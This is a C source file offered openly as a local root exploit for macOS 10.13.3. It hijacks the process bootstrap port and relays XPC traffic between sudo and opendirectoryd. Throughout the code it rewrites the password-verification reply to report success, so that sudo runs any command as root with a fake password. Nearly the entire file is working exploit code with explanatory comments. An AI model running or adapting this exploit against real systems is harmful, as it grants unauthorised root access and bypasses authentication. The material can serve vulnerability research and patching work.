/*
 * ssudo.c - local root exploit for macOS 10.13.3
 *
 * Achieves MitM between sudo and opendirectoryd (which verifies passwords) by
 * abusing the task_set_special_port API to overwrite the bootstrap port.
 *
 * Program flow:
 * 1. Overwrite the bootstrap port, start threads to bridge XPC traffic to
 *    opendirectoryd, forward traffic to launchd but resolve opendirectoryd
 *    to our own port instead
 * 2. Fork and exec sudo. Sudo will talk to opendirectoryd to verify the
 *    password. We modify the reply to indicate success
 * 3. sudo executes this binary again. We detect that and restore the bootstrap
 *    port, then run the requested command
 *
 * Limitations: currently stderr is set to stdout in the child processes, see comments below
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <bootstrap.h>
#include <errno.h>

#include <spc.h>

#define TARGET_SERVICE "com.apple.system.opendirectoryd.api"
#define SERVICE_NAME "net.saelo.hax"

// Need to declare this since it's not included in bootstrap.h
extern kern_return_t bootstrap_register2(mach_port_t bp, name_t service_name, mach_port_t sp, int flags);

mach_port_t bootstrap_port, fake_bootstrap_port, fake_service_port, real_service_port;
pthread_t fake_service_thread, bridge_threads[2];

void get_bootstrap_port()
{
    kern_return_t kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap_port);
    ASSERT_MACH_SUCCESS(kr, "task_get_special_port");
}

// Generic XPC bridge. Works only for messages that do not expect a reply.
void* bridge_connection(void* arg)
{
    spc_connection_t* bridge = arg;
    while (1) {
        spc_message_t* msg = spc_recv(bridge->receive_port);

        msg->local_port.name = MACH_PORT_NULL;
        msg->local_port.type = 0;
        msg->remote_port.name = bridge->send_port;
        msg->remote_port.type = MACH_MSG_TYPE_COPY_SEND;

        // Hack 3: replace "error: 5000" with "error: 0" to indicate success
        spc_dictionary_item_t* item = spc_dictionary_lookup(msg->content, "error");
        if (item)
            item->value.value.u64 = 0;

        spc_send(msg);

        spc_message_destroy(msg);

    }
    return NULL;
}

void* fake_service_main(void* arg)
{
    int ret;

    // Await incoming connection
    spc_connection_t* client_connection = spc_accept_connection(fake_service_port);
    spc_connection_t* service_connection = spc_create_connection_mach_port(real_service_port);

    spc_connection_t* bridge_1 = malloc(sizeof(spc_connection_t));
    spc_connection_t* bridge_2 = malloc(sizeof(spc_connection_t));

    bridge_1->receive_port = client_connection->receive_port;
    bridge_1->send_port    = service_connection->send_port;
    bridge_2->receive_port = service_connection->receive_port;
    bridge_2->send_port    = client_connection->send_port;

    ret = pthread_create(&bridge_threads[0], NULL, &bridge_connection, bridge_1);
    ASSERT_POSIX_SUCCESS(ret, "pthread_create");

    ret = pthread_create(&bridge_threads[1], NULL, &bridge_connection, bridge_2);
    ASSERT_POSIX_SUCCESS(ret, "pthread_create");

    free(client_connection);
    free(service_connection);

    return NULL;
}

void start_fake_service()
{
    kern_return_t kr;

    // Resolve real service port for later
    kr = bootstrap_look_up(bootstrap_port, TARGET_SERVICE, &real_service_port);
    ASSERT_MACH_SUCCESS(kr, "bootstrap_look_up");

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_service_port);
    ASSERT_MACH_SUCCESS(kr, "mach_port_allocate");

    kr = bootstrap_register2(bootstrap_port, SERVICE_NAME, fake_service_port, 0);
    ASSERT_MACH_SUCCESS(kr, "bootstrap_register2");

    // Run the fake service in a separate thread
    int ret = pthread_create(&fake_service_thread, NULL, &fake_service_main, NULL);
    ASSERT_POSIX_SUCCESS(ret, "pthread_create");
}

void setup_fake_bootstrap_port()
{
    kern_return_t kr;
    mach_port_t fake_bootstrap_send_port;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_bootstrap_port);
    ASSERT_MACH_SUCCESS(kr, "mach_port_allocate");

    mach_msg_type_name_t aquired_type;
    kr = mach_port_extract_right(mach_task_self(), fake_bootstrap_port, MACH_MSG_TYPE_MAKE_SEND, &fake_bootstrap_send_port, &aquired_type);
    ASSERT_MACH_SUCCESS(kr, "mach_port_allocate");

    // Hack 1: replace the bootstrap port of this and all child processes with our own port
    kr = task_set_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, fake_bootstrap_send_port);
    ASSERT_MACH_SUCCESS(kr, "task_set_special_port");
}

void restore_bootstrap_port()
{
    spc_dictionary_t* msg = spc_dictionary_create();
    spc_dictionary_t* reply;
    spc_domain_routine(0x31337, msg, &reply);

    mach_port_t bootstrap_port = spc_dictionary_get_send_port(reply, "original_bootstrap_port");
    kern_return_t kr = task_set_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, bootstrap_port);
    ASSERT_MACH_SUCCESS(kr, "task_set_special_port");

    spc_dictionary_destroy(msg);
    spc_dictionary_destroy(reply);
}

void handle_sigchld()
{
    exit(0);
}

// Spawn the (privileged) child process with our controlled bootstrap port
void spawn_child(const char* self, const char* command)
{
    int stdin_pipe[2];
    pipe(stdin_pipe);

    pid_t pid = fork();
    if (pid == 0) {
        close(stdin_pipe[1]);

        // sudo will only preserve the first three file descriptors, so we abuse
        // stdout to remporarily hold on to stdin.
        // TODO to fix this we'd have to fetch the original file descriptors
        // from the parent via XPC.
        dup2(STDOUT_FILENO, STDERR_FILENO);
        dup2(STDIN_FILENO, STDOUT_FILENO);
        dup2(stdin_pipe[0], STDIN_FILENO);

        execl("/usr/bin/sudo", "/usr/bin/sudo", "--prompt=", "--stdin", self, command, NULL);
        ASSERT_POSIX_SUCCESS(errno, "execl");
    } else if (pid < 0) {
        puts("Fork failed");
        ASSERT_POSIX_SUCCESS(errno, "fork");
    }
    close(stdin_pipe[0]);

    struct sigaction sa;
    sa.sa_handler = &handle_sigchld;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    if (sigaction(SIGCHLD, &sa, 0) == -1) {
      printf("sigaction failed\n");
      exit(-1);
    }

    // Send a "password" so sudo continues
    write(stdin_pipe[1], "i_can_haz_root\n", 16);
}

void bridge_launchd_connection()
{
    // For launchd messages, libxpc checks that the reply comes from pid 1 and uid 0.
    // As such, we have to let launchd send the replies directly to our child process.
    // However, we can manipulate the messages sent to launchd and can thus resolve
    // services to different (controlled) ports.

    while (1) {
        // Wait for the next bootstrap message from a child process.
        spc_message_t* msg = spc_recv(fake_bootstrap_port);

        // Special routine: allow child processes to restore the bootstrap port
        if (spc_dictionary_get_uint64(msg->content, "routine") == 0x31337) {
            spc_dictionary_t* reply = spc_dictionary_create();
            spc_dictionary_set_send_port(reply, "original_bootstrap_port", bootstrap_port);
            spc_reply(msg, reply);
            spc_message_destroy(msg);
            spc_dictionary_destroy(reply);
            continue;
        }

        // Rewrite source (our child process) and destination (real launchd) of message.
        msg->local_port.name = msg->remote_port.name;
        msg->local_port.type = MACH_MSG_TYPE_MOVE_SEND_ONCE;
        msg->remote_port.name = bootstrap_port;
        msg->remote_port.type = MACH_MSG_TYPE_COPY_SEND;

        // Possibly modify the message before forwarding to launchd
        if (spc_dictionary_get_send_port(msg->content, "domain-port") == fake_bootstrap_port) {
            // Must replace our fake bootstrap port in the content of the message with the real one.
            spc_dictionary_set_send_port(msg->content, "domain-port", bootstrap_port);
        }
        if (strcmp(spc_dictionary_get_string(msg->content, "name"), TARGET_SERVICE) == 0) {
            // Hack 2: resolve the target service to our fake service instead >:)
            spc_dictionary_set_string(msg->content, "name", SERVICE_NAME);

            // Must also change a few of the other fields of the message...
            spc_dictionary_set_uint64(msg->content, "flags", 0);
            spc_dictionary_set_uint64(msg->content, "subsystem", 5);
            spc_dictionary_set_uint64(msg->content, "routine", 207);
            spc_dictionary_set_uint64(msg->content, "type", 7);
        }

        // Forward to launchd
        spc_send(msg);

        spc_message_destroy(msg);
    }
}

int main(int argc, char** argv)
{
    if (argc < 2) {
        printf("Usage: %s command\n", argv[0]);
        return 0;
    }

    if (getuid() == 0) {
        // We are being executed by sudo. We now need to restore the original
        // bootstrap port and stdin fd and then execute the requested command
        restore_bootstrap_port();
        dup2(STDOUT_FILENO, STDIN_FILENO);
        dup2(STDERR_FILENO, STDOUT_FILENO);
        return execl("/bin/bash", "/bin/bash", "-c", argv[1], NULL);
    }

    // Copy command into one string suitable for "bash -c"
    size_t size = 0;
    for (int i = 1; i < argc; i++) {
        size += strlen(argv[i]) + 1;
    }
    char* command = calloc(size, 1);
    for (int i = 1; i < argc; i++) {
        strlcat(command, argv[i], size);
        strlcat(command, " ", size);      // final whitespace will not be written due to size limit
    }

    get_bootstrap_port();
    start_fake_service();
    setup_fake_bootstrap_port();
    spawn_child(argv[0], command);
    bridge_launchd_connection();

    return 0;
}
